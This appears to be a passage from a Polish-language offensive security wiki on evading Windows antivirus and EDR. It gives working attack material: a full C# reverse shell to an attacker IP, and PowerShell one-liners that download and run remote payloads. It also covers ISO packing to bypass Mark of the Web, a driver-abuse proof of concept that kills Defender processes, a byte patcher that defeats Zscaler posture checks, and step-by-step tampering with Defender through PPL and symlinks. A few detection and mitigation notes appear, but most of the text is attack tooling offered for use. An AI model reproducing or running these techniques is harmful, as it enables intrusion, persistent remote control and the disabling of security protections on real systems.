- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework do fine-grained code obfuscation dla języków wspieranych przez LLVM, używający ROP (return-oriented programming). ROPfuscator obfuscates program na poziomie assembly code przez przekształcanie zwykłych instrukcji w łańcuchy ROP, podważając nasze naturalne pojmowanie normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi convert existing EXE/DLL into shellcode i następnie je load them

## SmartScreen & MoTW

Możesz widzieć ten ekran podczas pobierania niektórych executables z internetu i uruchamiania ich.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa przeznaczony do ochrony końcowego użytkownika przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o podejście oparte na reputacji, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, ostrzegając i uniemożliwiając końcowemu użytkownikowi uruchomienie pliku (chociaż plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu, wraz z adresem URL, z którego został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto zauważyć, że executables podpisane **zaufanym** certyfikatem podpisującym **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem na zapobieganie oznaczaniu payloads jako Mark of The Web jest pakowanie ich wewnątrz jakiegoś kontenera, takiego jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być zastosowany do wolumenów **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloads do kontenerów wyjściowych, aby ominąć Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Oto demo omijania SmartScreen przez pakowanie payloads wewnątrz plików ISO przy użyciu [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym **rejestrować zdarzenia**. Może być jednak także używany przez produkty bezpieczeństwa do monitorowania i wykrywania złośliwych aktywności.

Podobnie jak AMSI jest wyłączane (bypassed), możliwe jest też sprawienie, aby funkcja **`EtwEventWrite`** procesu w przestrzeni użytkownika natychmiast zwracała bez logowania jakichkolwiek zdarzeń. Osiąga się to przez patchowanie funkcji w pamięci tak, aby od razu zwracała, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binariów C# do pamięci jest znane już od dłuższego czasu i nadal jest bardzo dobrym sposobem uruchamiania twoich narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci bez dotykania dysku, będziemy musieli martwić się tylko o patchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) już zapewnia możliwość wykonywania C# assemblies bezpośrednio w pamięci, ale istnieją różne sposoby, aby to zrobić:

- **Fork\&Run**

Polega to na **tworzeniu nowego procesu ofiarnego**, wstrzykiwaniu twojego złośliwego kodu post-exploitation do tego nowego procesu, wykonywaniu go, a po zakończeniu zabiciu nowego procesu. Ma to zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** procesem naszego implant Beacon. Oznacza to, że jeśli coś w naszej akcji post-exploitation pójdzie nie tak albo zostanie wykryte, istnieje **znacznie większa szansa**, że **implant przetrwa.** Wadą jest **znacznie większa szansa** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Chodzi o wstrzykiwanie złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonywania payloadu, jest **znacznie większa szansa** na **utratę twojego beacon**, ponieważ może dojść do crasha.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu C# Assembly, sprawdź ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować C# Assemblies **z PowerShell**, sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [wideo S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu przy użyciu innych języków, dając zaatakowanej maszynie dostęp **do środowiska interpretera zainstalowanego na Attacker Controlled SMB share**.

Umożliwiając dostęp do Interpreter Binaries i środowiska na SMB share, możesz **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

Repo wskazuje: Defender nadal skanuje skrypty, ale dzięki wykorzystaniu Go, Java, PHP itd. mamy **większą elastyczność w omijaniu statycznych sygnatur**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się sukcesem.

## TokenStomping

Token stomping to technika, która pozwala atakującemu **manipulować access token lub security prouc t jak EDR lub AV**, umożliwiając obniżenie ich uprawnień, tak aby proces nie zginął, ale nie miał uprawnień do sprawdzania złośliwej aktywności.

Aby temu zapobiec, Windows mógłby **uniemożliwić zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów bezpieczeństwa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest po prostu wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia kontroli i utrzymania persistence:
1. Pobierz z https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie kliknij plik MSI dla Windows, aby pobrać plik MSI.
2. Uruchom instalator po cichu na ofierze (wymagane admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć do strony Chrome Remote Desktop i kliknij next. Kreator poprosi wtedy o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr z pewnymi zmianami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Zwróć uwagę na parametr pin, który pozwala ustawić pin bez używania GUI).


## Advanced Evasion

Evasion to bardzo złożony temat, czasem trzeba brać pod uwagę wiele różnych źródeł telemetry w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, przeciwko któremu działasz, będzie miało własne mocne i słabe strony.

Bardzo zachęcam do obejrzenia tej prelekcji od [@ATTL4S](https://twitter.com/DaniLJ94), aby zdobyć punkt zaczepienia do bardziej zaawansowanych technik Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także kolejna świetna prelekcja od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który **usuwa fragmenty binarki** aż **ustali, która część** jest uznawana przez Defender za złośliwą, i wyodrębnia ją dla ciebie.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred) z otwartą usługą webową pod [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10 wszystkie wersje Windows miały **Telnet server**, który można było zainstalować (jako administrator), wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ustaw to tak, aby **uruchamiało się** przy starcie systemu i **uruchom** je teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz stąd: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz pliki bin, a nie setup)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj server:

- Włącz opcję _Disable TrayIcon_
- Ustaw password w _VNC Password_
- Ustaw password w _View-Only Password_

Następnie przenieś binary _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ do **victim**

#### **Reverse connection**

**attacker** powinien **uruchomić na** swoim **hoście** binary `vncviewer.exe -listen 5900`, aby był **gotowy** do przechwycenia reverse **VNC connection**. Następnie, na **victim**: Uruchom daemon winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Aby zachować stealth, nie możesz robić kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [popup](https://i.imgur.com/1SROTTl.png). sprawdź, czy działa, używając `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [the config window](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` po pomoc, bo wywołasz [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz stąd: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** z `msfconsole -r file.rc` i **wykonaj** **xml payload** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Używaj z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia python do budowania injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator** do wyłączenia ochron endpointów przed uruchomieniem ransomware. Narzędzie dostarcza swój **własny podatny, ale *signed* driver** i nadużywa go, aby wykonywać uprzywilejowane operacje jądra, których nawet usługi Protected-Process-Light (PPL) AV nie mogą zablokować.

Kluczowe wnioski
1. **Signed driver**: Plik dostarczany na dysk to `ServiceMouse.sys`, ale binarka to legalnie signed driver `AToolsKrnl64.sys` z “System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ driver ma poprawny podpis Microsoft, ładuje się nawet przy włączonym Driver-Signature-Enforcement (DSE).
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje driver jako **kernel service**, a druga uruchamia go, dzięki czemu `\\.\ServiceMouse` staje się dostępne z user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończ dowolny proces po PID (używane do ubijania usług Defender/EDR) |
| `0x990000D0` | Usuń dowolny plik z dysku |
| `0x990001D0` | Załaduj wstecz driver i usuń usługę |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD całkowicie omija zabezpieczenia user-mode; kod wykonywany w kernel może otwierać *protected* procesy, kończyć je lub modyfikować obiekty jądra niezależnie od PPL/PP, ELAM lub innych mechanizmów hardeningu.

Detection / Mitigation
•  Włącz Microsoft vulnerable-driver block list (`HVCI`, `Smart App Control`), aby Windows odrzucał ładowanie `AToolsKrnl64.sys`.
•  Monitoruj tworzenie nowych usług *kernel* i alarmuj, gdy driver jest ładowany z katalogu world-writable lub nie znajduje się na allow-list.
•  Obserwuj uchwyty user-mode do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

**Client Connector** firmy Zscaler stosuje lokalnie reguły device-posture i używa Windows RPC do przekazywania wyników do innych komponentów. Dwie słabe decyzje projektowe sprawiają, że możliwy jest pełny bypass:

1. Ocena posture odbywa się **w całości po stronie klienta** (na serwer wysyłana jest wartość boolean).
2. Wewnętrzne endpointy RPC sprawdzają jedynie, czy łącząca się binarka jest **signed by Zscaler** (przez `WinVerifyTrust`).

Poprzez **patching czterech signed binaries on disk** można zneutralizować oba mechanizmy:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każdy check jest compliant |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | NOP-ed ⇒ każdy proces (nawet unsigned) może podłączyć się do pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks na tunelu | Short-circuited |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole posture pokazują **green/compliant**.
* Niepodpisane lub zmodyfikowane binaria mogą otwierać endpointy RPC named-pipe (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Skompromitowany host zyskuje nieograniczony dostęp do wewnętrznej sieci zdefiniowanej przez polityki Zscaler.

To case study pokazuje, jak wyłącznie client-side decyzje zaufania i proste sprawdzanie signature mogą zostać pokonane kilkoma patchami bajtów.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) wymusza hierarchię signer/level, tak aby tylko procesy chronione o równym lub wyższym poziomie mogły modyfikować się nawzajem. Z ofensywnego punktu widzenia, jeśli możesz legalnie uruchomić binary z włączonym PPL i kontrolować jego arguments, możesz przekształcić benign functionality (np. logging) w ograniczony, oparty na PPL write primitive przeciwko protected directories używanym przez AV/EDR.

Co sprawia, że proces działa jako PPL
- Docelowy EXE (i każda załadowana DLL) musi być podpisany przez EKU obsługujące PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego protection level, który pasuje do signer binary (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla signerów anti-malware, `PROTECTION_LEVEL_WINDOWS` dla signerów Windows). Nieprawidłowe poziomy spowodują błąd podczas tworzenia.

Zobacz też szersze wprowadzenie do PP/PPL i ochrony LSASS tutaj:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (wybiera protection level i przekazuje arguments do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Podpisany binarny plik systemowy `C:\Windows\System32\ClipUp.exe` sam się uruchamia i akceptuje parametr do zapisania pliku logu w ścieżce wskazanej przez wywołującego.
- Gdy uruchomiony jako proces PPL, zapis pliku odbywa się z backing PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj 8.3 short paths, aby wskazać normalnie chronione lokalizacje.

8.3 short path helpers
- List short names: `dir /x` w każdym katalogu nadrzędnym.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom LOLBIN zdolny do PPL (ClipUp) z `CREATE_PROTECTED_PROCESS` używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj 8.3 short names.
3) Jeśli docelowy binarny plik jest normalnie otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis przy starcie systemu, zanim AV się uruchomi, instalując usługę auto-start, która niezawodnie startuje wcześniej. Zweryfikuj kolejność bootowania za pomocą Process Monitor (boot logging).
4) Po ponownym uruchomieniu zapis z backing PPL nastąpi zanim AV zablokuje swoje binaria, uszkadzając docelowy plik i uniemożliwiając start.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie możesz kontrolować zawartości, którą ClipUp zapisuje poza umiejscowieniem; ten primitive nadaje się do corruption, a nie do precyzyjnego wstrzykiwania treści.
- Wymaga local admin/SYSTEM do zainstalowania/uruchomienia usługi oraz okna restartu.
- Czas jest krytyczny: cel nie może być otwarty; wykonanie w czasie boot omija blokady plików.

Detections
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy parentem są niestandardowe launchers, w okolicach boot.
- Nowe usługi skonfigurowane do auto-startu podejrzanych binariów i konsekwentnie uruchamiane przed Defender/AV. Sprawdź tworzenie/modyfikację usług przed błędami startu Defendera.
- File integrity monitoring na binariach Defendera/katalogach Platform; nieoczekiwane tworzenie/modyfikacje plików przez procesy z protected-process flags.
- Telemetria ETW/EDR: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` i anomaliami użycia PPL level przez binaria inne niż AV.

Mitigations
- WDAC/Code Integrity: ogranicz, które podpisane binaria mogą działać jako PPL i pod jakimi parentami; blokuj wywołanie ClipUp poza legalnymi kontekstami.
- Service hygiene: ogranicz tworzenie/modyfikację usług auto-start i monitoruj manipulacje kolejnością startu.
- Upewnij się, że włączone są Defender tamper protection i early-launch protections; badaj błędy startu wskazujące na corruption binariów.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na wolumenach hostujących tooling bezpieczeństwa, jeśli jest to zgodne z twoim środowiskiem (testuj dokładnie).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wybiera platformę, z której działa, poprzez enumerację podfolderów pod:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie stringiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia z niego procesy usługi Defendera (aktualizując odpowiednio ścieżki usługi/rejestru). Ten wybór ufa wpisom katalogu, w tym directory reparse points (symlinks). Administrator może to wykorzystać, aby przekierować Defendera do ścieżki zapisywalnej przez atakującego i uzyskać DLL sideloading albo disruption usługi.

Preconditions
- Local Administrator (potrzebny do tworzenia katalogów/symlinków w folderze Platform)
- Możliwość rebootu lub wywołania ponownego wyboru platformy Defendera (restart usługi przy boot)
- Wymagane tylko wbudowane narzędzia (mklink)

Why it works
- Defender blokuje zapisy we własnych folderach, ale wybór platformy ufa wpisom katalogu i wybiera najwyższą leksykograficznie wersję bez weryfikacji, czy cel rozwiązuje się do chronionej/zaufanej ścieżki.

Step-by-step (example)
1) Przygotuj zapisywalny klon bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz symlink katalogu o wyższej wersji wewnątrz Platform wskazujący na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wyzwolenie wyboru (zalecany reboot):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, że MsMpEng.exe (WinDefend) działa z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
